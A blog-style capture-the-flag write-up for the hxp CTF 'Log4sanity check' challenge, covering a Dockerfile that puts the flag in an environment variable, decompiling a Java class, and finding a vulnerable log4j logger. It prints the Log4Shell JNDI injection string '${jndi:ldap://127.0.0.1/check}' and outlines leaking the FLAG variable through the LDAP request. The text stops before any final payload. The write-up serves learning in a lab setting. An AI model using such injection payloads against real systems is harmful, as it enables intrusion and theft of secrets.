---
---

Hello, 

This is a detailed writeup for the Log4sanity check from hxp ctf hosted last week. 

You can find the challenge's files here : 

Basically, I'm not a Java fan but I totally enjoyed this challenge and its learning journey, so that's why I'm sharing this writeup : 


After a simple investigation of the Dockerfile, this caught my eye :
` CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 "FLAG='$(cat /flag.txt)' /home/ctf/run.sh" `

well, **ynted** is a tiny server written in go which is used to manage microservices, with a cmd command that reads the flag's content and assign it to an environment variable. Nice ! so now we know our flag's location. 

More investigating the files, we see a Vuln.class, after running the file command, we can see that it's a compiled java class, so we need to a decompiler to investigate the vulnerability. After some research, I found an Open Source tool called [Byte code viewer](https://github.com/Konloch/bytecode-viewer), installing it and running it on our vulnerable class. 

Basically, it's simple java class which prints "What is your favourite CTF?", scan's for an input and assign it to var2, then runs an if condition, and if there's any error, it catches it, very simple, and nothing suspisious, hell no ! we can see from the imports that it's using the vulnerable log4j module, and at line 20, it uses the logger var1 and prints the error message, so it's clear that we can inject our famous payload : '${jndi:ldap://127.0.0.1/check}' and check if it throws an error (You can find a well explained video of the log4j vulnerability by LiveOverFlow [here](https://www.youtube.com/watch?v=w2F67LbEtnk)) 


Bingo! It's vulnerable, now it's time for building our puzzle : 

- Flag is located in environment variable called FLAG 
- We have a vulnerable java loggin library
- ${jndi:ldap://127.0.0.1/check} could work as payload

Similar to the spirit of "Reflected XSS" where we append the cookie to the url, here we can append the Flag to the ldap request, and it will be then logged and we will see it in the console : 

